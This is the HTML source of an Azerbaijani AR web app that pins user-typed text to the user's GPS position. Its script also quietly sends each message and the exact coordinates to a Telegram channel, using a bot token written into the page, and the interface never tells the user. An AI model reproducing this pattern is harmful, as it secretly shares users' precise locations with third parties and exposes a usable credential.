<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Görən Göz v3.1 PRO</title>
    <script src="https://aframe.io/releases/1.3.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar-nft.js"></script>
    <script src="https://unpkg.com/aframe-look-at-component@0.8.0/dist/aframe-look-at-component.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; overflow: hidden; background: #000; font-family: 'Segoe UI', Roboto, sans-serif; }
        
        /* Üst Panel */
        .top-bar {
            position: fixed; top: 0; width: 100%; height: 60px;
            background: rgba(0,0,0,0.85); border-bottom: 2px solid #00f2ea;
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 15px; z-index: 5000;
        }

        /* Düymələrin Mərkəzləşdirilməsi və Dizaynı */
        .bottom-ui {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            width: 95%; max-width: 400px; z-index: 5000;
            display: flex; flex-direction: column; align-items: center; gap: 15px;
        }

        .main-input-group {
            width: 100%; display: flex; align-items: center;
            background: rgba(20, 20, 20, 0.95); border-radius: 50px;
            padding: 8px 12px; border: 2px solid #333;
            box-shadow: 0 0 20px rgba(0,242,234,0.3);
        }

        #msg-input {
            flex: 1; background: transparent; border: none; color: white;
            padding: 10px; font-size: 16px; outline: none;
        }

        .btn-circle {
            width: 55px; height: 55px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            border: none; cursor: pointer; transition: 0.3s; color: white;
        }

        #send-btn { background: #ff0050; font-size: 22px; box-shadow: 0 0 15px #ff0050; }
        .icon-btn { background: #222; font-size: 20px; color: #00f2ea; margin: 0 5px; }

        /* AR Obyektin görünməsi üçün köməkçi */
        #ar-hint {
            position: fixed; top: 80px; width: 100%; text-align: center;
            color: #00f2ea; font-weight: bold; z-index: 4000; text-shadow: 0 0 10px #000;
        }
    </style>
</head>

<body>

    <div class="top-bar">
        <div style="color: #00f2ea; font-weight: bold;">GÖRƏN GÖZ v3.1</div>
        <div id="gps-info" style="color: white; font-size: 12px; font-family: monospace;">GPS: Axtarılır...</div>
    </div>

    <div id="ar-hint">İz qoymaq üçün aşağıdan yazın...</div>

    <div class="bottom-ui">
        <div class="main-input-group">
            <label for="file-upload"><i class="fas fa-music icon-btn btn-circle"></i></label>
            <input type="file" id="file-upload" accept="audio/*" style="display:none;">
            
            <input type="text" id="msg-input" placeholder="Məkana iz burax...">
            
            <i class="fas fa-microphone icon-btn btn-circle" id="voice-btn"></i>
            <button id="send-btn"><i class="fas fa-paper-plane"></i></button>
        </div>
    </div>

    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;" vr-mode-ui="enabled: false">
        <a-camera gps-camera="minDistance: 0; maxDistance: 1000;" rotation-reader>
            <a-entity cursor="fuse: false" position="0 0 -1"
                      geometry="primitive: ring; radiusInner: 0.02; radiusOuter: 0.03"
                      material="color: #00f2ea; shader: flat">
            </a-entity>
        </a-camera>
        <a-entity id="ar-world"></a-entity>
    </a-scene>

    <script>
        const TG_TOKEN = "8799012820:AAEPVV76TIkjw9L_Jh6DUqpNHGBdMLd770A";
        const TG_CHAT = "@vidosmarkarxiv";
        let lat, lon;

        // GPS İzləmə
        navigator.geolocation.watchPosition(p => {
            lat = p.coords.latitude;
            lon = p.coords.longitude;
            document.getElementById('gps-info').innerText = `Xəta: ${p.coords.accuracy.toFixed(1)}m`;
        }, null, {enableHighAccuracy: true});

        function placeAR(content, type = 'text') {
            if(!lat) return alert("GPS hələ hazır deyil!");

            const scene = document.getElementById('ar-world');
            const entity = document.createElement('a-entity');

            // GPS yerini təyin edirik
            entity.setAttribute('gps-entity-place', `latitude: ${lat}; longitude: ${lon}`);
            entity.setAttribute('look-at', '[gps-camera]');
            
            // OBYEKTİN GÖRÜNMƏSİ ÜÇÜN ƏN VACİB HİSSƏ:
            // "scale" (ölçü) 20 olmalıdır ki, 10 metr kənara düşsə belə görünsün.
            entity.setAttribute('scale', '20 20 20');
            
            // Obyektin daxili (Qutu və ya Yazı)
            const box = document.createElement('a-box');
            box.setAttribute('color', '#1a1a1a');
            box.setAttribute('width', '2'); box.setAttribute('height', '0.6');
            
            const txt = document.createElement('a-text');
            txt.setAttribute('value', content.substring(0,20));
            txt.setAttribute('align', 'center');
            txt.setAttribute('position', '0 0 0.55');
            txt.setAttribute('width', '4');

            box.appendChild(txt);
            entity.appendChild(box);
            scene.appendChild(entity);

            // Teleqrama göndər
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=YENİ İZ: ${content}\nMəkan: ${lat},${lon}`);
            
            document.getElementById('ar-hint').innerText = "İz qoyuldu! Kameranı sağa-sola çevir.";
            setTimeout(() => { document.getElementById('ar-hint').innerText = ""; }, 5000);
        }

        document.getElementById('send-btn').onclick = () => {
            const val = document.getElementById('msg-input').value;
            if(val) {
                placeAR(val, 'text');
                document.getElementById('msg-input').value = "";
            }
        };
    </script>
</body>
</html>
